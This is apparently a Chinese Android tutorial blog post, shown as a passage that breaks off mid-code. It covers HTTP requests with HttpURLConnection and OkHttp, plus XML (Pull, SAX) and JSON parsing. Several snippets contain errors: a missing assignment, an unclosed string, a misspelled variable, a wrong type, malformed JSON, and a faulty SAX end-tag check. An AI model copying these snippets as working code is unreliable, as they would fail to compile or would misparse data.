<h2 id="使用HTTP协议访问网络"><a href="#使用HTTP协议访问网络" class="headerlink" title="使用HTTP协议访问网络"></a>使用HTTP协议访问网络</h2><h3 id="使用HttpURLConnection"><a href="#使用HttpURLConnection" class="headerlink" title="使用HttpURLConnection"></a>使用HttpURLConnection</h3><p>获取HttpURLConnection实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">URL url = <span class="keyword">new</span> URL(<span class="string">"http://www.baidu.com"</span>);</span><br><span class="line"><span class="function">HttpURLConnection <span class="title">connection</span> <span class="params">(HttpURLConnection)</span> url.<span class="title">openConnection</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>设置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connection.setRequestMethod(<span class="string">"GET);</span></span><br><span class="line"><span class="string">connection.setConnectTimeout(8000);</span></span><br><span class="line"><span class="string">connection.setReadTimeout(8000);</span></span><br></pre></td></tr></table></figure>

<p>然后获取服务器返回的输入流：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InputStream in = connection.getInputStream();</span><br></pre></td></tr></table></figure>

<p>关闭HTTP连接：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connection.disconnect();</span><br></pre></td></tr></table></figure>

<p>下面进行实战，首先修改布局文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/send_request"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Send Request"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ScrollView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span> &gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">"@+id/response_text"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ScrollView</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后修改代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    TextView responseText;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (v.getId() == R.id.send_request)&#123;</span><br><span class="line">            sendRequestWithHttpURLConnection();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithHttpURLConnection</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                HttpURLConnection connection = <span class="keyword">null</span>;</span><br><span class="line">                BufferedReader reader = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    URL url = <span class="keyword">new</span> URL(<span class="string">"http://www.baidu.com"</span>);</span><br><span class="line">                    connection = (HttpURLConnection) url.openConnection();</span><br><span class="line">                    connection.setRequestMethod(<span class="string">"GET"</span>);</span><br><span class="line">                    connection.setConnectTimeout(<span class="number">8000</span>);</span><br><span class="line">                    connection.setReadTimeout(<span class="number">8000</span>);</span><br><span class="line">                    InputStream in = connection.getInputStream();</span><br><span class="line">                    reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">                    StringBuilder response = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        response.append(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                    showResponse(response.toString());</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(reader != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">try</span>&#123;</span><br><span class="line">                            reader.close();</span><br><span class="line">                        &#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (connection != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        connection.disconnect();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">showResponse</span><span class="params">(<span class="keyword">final</span> String response)</span></span>&#123;</span><br><span class="line">        runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                responseText.setText(response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Android不允许在子线程中进行UI操作，runOnUiThread()方法用于将线程切换到主线程，然后再更新UI元素。</p>
<p>如果想提交数据，可用如下方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connection.setRequestMethod(<span class="string">"POST"</span>);</span><br><span class="line">DataOutputStream out = <span class="keyword">new</span> DataOutputStream(conncetion.getOutputStream());</span><br><span class="line">out.writeBytes(<span class="string">"username=admin&amp;password=123456"</span>);</span><br></pre></td></tr></table></figure>

<h3 id="使用OkHttp"><a href="#使用OkHttp" class="headerlink" title="使用OkHttp"></a>使用OkHttp</h3><p>源码地址：<a href="http://github.com/square/okhttp" target="_blank" rel="noopener">http://github.com/square/okhttp</a></p>
<p>首先添加库依赖，在app/build.gradle的dependencies闭包中添加：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">implementation <span class="string">'com.squareup.okhttp3:okhttp:3.4.1'</span></span><br></pre></td></tr></table></figure>

<p>然后创建一个OkHttpClient实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br></pre></td></tr></table></figure>

<p>然后创建一个Request对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">    .url(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure>

<p>之后发起请求并获取返回数据：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Response response = client.newCall(request).execute();</span><br></pre></td></tr></table></figure>

<p>我们可以使用如下写法来获得返回的具体内容：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String responseData = response.body().string();</span><br></pre></td></tr></table></figure>

<p>发起POST请求写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Request requestBody = <span class="keyword">new</span> FormBody.Builder()</span><br><span class="line">	.add(<span class="string">"username"</span>, <span class="string">"admin"</span>)</span><br><span class="line">    .add(<span class="string">"password"</span>, <span class="string">"123456"</span>)</span><br><span class="line">    .build();</span><br><span class="line">Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">    .url(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line">    .post(requestBody)</span><br><span class="line">    .build();</span><br><span class="line">Response response = client.newCall(request).execute();</span><br><span class="line">String responseData = response.body().string();</span><br></pre></td></tr></table></figure>

<p>实践下，布局部分不用改，直接修改代码即可：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    TextView responseText;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (v.getId() == R.id.send_request)&#123;</span><br><span class="line">                sendRequestWithOkHttp();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responseData = response.body().string();</span><br><span class="line">                    showResponse(responseData);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">showResponse</span><span class="params">(<span class="keyword">final</span> String response)</span></span>&#123;</span><br><span class="line">        runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                responseText.setText(response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就完成了OkHttp的基本用法了。</p>
<h2 id="解析XML格式数据"><a href="#解析XML格式数据" class="headerlink" title="解析XML格式数据"></a>解析XML格式数据</h2><p>这里首先搭建一个web服务器用于提供数据。（这块就直接百度找吧，这里懒得搞）</p>
<p>在网站目录下添加一个get_data.xml文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">apps</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">app</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>1<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Google Maps<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">app</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Chrome<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">app</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>3<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Google Play<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">apps</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后就开始在android程序里获取和解析这段数据。</p>
<h3 id="Pull解析方式"><a href="#Pull解析方式" class="headerlink" title="Pull解析方式"></a>Pull解析方式</h3><p>这里继续之前的项目代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    TextView responseText;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (v.getId() == R.id.send_request)&#123;</span><br><span class="line">                sendRequestWithOkHttp();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">"http://localhost/get_data.xml"</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responseData = response.body().string();</span><br><span class="line">                    parseXMLWithPull(responseData);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseXMLWithPull</span><span class="params">(String xmlData)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            XmlPullParserFactory factory = XmlPullParserFactory.newInstance();</span><br><span class="line">            XmlPullParser xmlPullParser = factory.newPullParser();</span><br><span class="line">            xmlPullParser.setInput(<span class="keyword">new</span> StringReader(xmlData));</span><br><span class="line">            <span class="keyword">int</span> eventType = xmlPullParser.getEventType();</span><br><span class="line">            String id = <span class="string">""</span>;</span><br><span class="line">            String name = <span class="string">""</span>;</span><br><span class="line">            String version = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">while</span> (eventType != XmlPullParser.END_DOCUMENT) &#123;</span><br><span class="line">                String nodeName = xmlPullParser.getName();</span><br><span class="line">                <span class="keyword">switch</span> (eventType) &#123;</span><br><span class="line">                    <span class="keyword">case</span> XmlPullParser.START_TAG: &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="string">"id"</span>.equals(nodeName)) &#123;</span><br><span class="line">                            id = xmlPullParser.nextText();</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"name"</span>.equals(nodeName)) &#123;</span><br><span class="line">                            name = xmlPullParser.nextText();</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"version"</span>.equals(nodeName)) &#123;</span><br><span class="line">                            version = xmlPullParser.nextText();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> XmlPullParser.END_TAG: &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="string">"app"</span>.equals(nodeName)) &#123;</span><br><span class="line">                            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"id is "</span> + id);</span><br><span class="line">                            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"name is "</span> + name);</span><br><span class="line">                            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"version is "</span> + version);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                eventType = xmlPullParser.next();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SAX解析方式"><a href="#SAX解析方式" class="headerlink" title="SAX解析方式"></a>SAX解析方式</h3><p>首先新建一个MyHandler类继承自DefaultHandler，修改为如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyHandler</span> <span class="keyword">extends</span> <span class="title">DefaultHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String nodeName;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder id;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder name;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder version;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException</span>&#123;</span><br><span class="line">        id = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        name = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        version = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException</span>&#123;</span><br><span class="line">        nodeName = localName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">characters</span><span class="params">(<span class="keyword">char</span>[] ch, <span class="keyword">int</span> start, <span class="keyword">int</span> length)</span> <span class="keyword">throws</span> SAXException</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"id"</span>.equals(nodeName))&#123;</span><br><span class="line">            id.append(ch, start, length);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">"name"</span>.equals(nodeName))&#123;</span><br><span class="line">            name.append(ch, start, length);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">"version"</span>.equals(nodeName))&#123;</span><br><span class="line">            version.append(ch, start, length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endElement</span><span class="params">(String uri, String localName, String qName)</span> <span class="keyword">throws</span> SAXException</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"app"</span>.equals(nodeName)) &#123;</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"id is "</span> + id.toString().trim());</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"name is "</span> + name.toString().trim());</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"version is "</span> + version.toString().trim());</span><br><span class="line">        &#125;</span><br><span class="line">        id.setLength(<span class="number">0</span>);</span><br><span class="line">        name.setLength(<span class="number">0</span>);</span><br><span class="line">        version.setLength(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.endDocument();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中trim()方法用于清除换行符。然后修改活动代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    TextView responseText;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (v.getId() == R.id.send_request)&#123;</span><br><span class="line">                sendRequestWithOkHttp();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">"http://localhost/get_data.xml"</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responseData = response.body().string();</span><br><span class="line">                    parseXMLWithSAX(responseData);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseXMLWithSAX</span><span class="params">(String xmlData)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SAXParserFactory factory = SAXParserFactory.newInstance();</span><br><span class="line">            XMLReader xmlReader = factory.newSAXParser().getXMLReader();</span><br><span class="line">            MyHandler handler = <span class="keyword">new</span> MyHandler();</span><br><span class="line">            xmlReader.setContentHandler(handler);</span><br><span class="line">            xmlReader.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(xmlData)));</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解析JSON个数数据"><a href="#解析JSON个数数据" class="headerlink" title="解析JSON个数数据"></a>解析JSON个数数据</h2><p>首先在网站目录下添加get_data.json文件：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">[&#123;"id":"5","version":"5.5","name","Clash of Clans"&#125;,</span><br><span class="line">&#123;"id":"6","version":"7.0","name","Boom Beach"&#125;,</span><br><span class="line">&#123;"id":"7","version":"3.5","name","Clash Royale"&#125;]</span><br></pre></td></tr></table></figure>

<h3 id="使用JSONObject"><a href="#使用JSONObject" class="headerlink" title="使用JSONObject"></a>使用JSONObject</h3><p>修改代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    TextView responseText;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (v.getId() == R.id.send_request)&#123;</span><br><span class="line">                sendRequestWithOkHttp();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span 